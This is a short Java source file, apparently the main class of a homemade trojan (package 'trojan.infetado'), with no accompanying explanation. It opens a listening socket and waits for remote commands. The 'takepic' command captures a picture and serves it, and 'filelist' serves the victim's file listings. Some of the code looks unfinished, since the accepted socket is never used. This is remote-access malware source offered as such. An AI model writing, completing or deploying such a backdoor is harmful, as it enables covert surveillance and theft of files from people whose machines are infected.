package trojan.infetado;

import java.awt.AWTException;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import network.ClienteCom;
import network.ServerArray;
import network.ServerFile;
import network.ServerPic;

public class Main {

    public static void main(String[] args) throws AWTException, IOException {

        final String pic = "takepic";
        final String off = "off";
        final String file = "filelist";

        ServerSocket servsock = new ServerSocket(80);
        Socket sock = servsock.accept();

        ClienteCom cc;
        cc = new ClienteCom();

        String msg = "on";
        do {

            msg = cc.getRead();

            if (msg.equals(pic)) {
                TakePicture aut = new TakePicture();
                aut.takePicture();
                ServerPic s = new ServerPic();
            } else if (msg.equals(file)) {
                ServerArray sa = new ServerArray();

                ServerFile sf = new ServerFile();
            }

        } while (!msg.equals(off));

    }

}
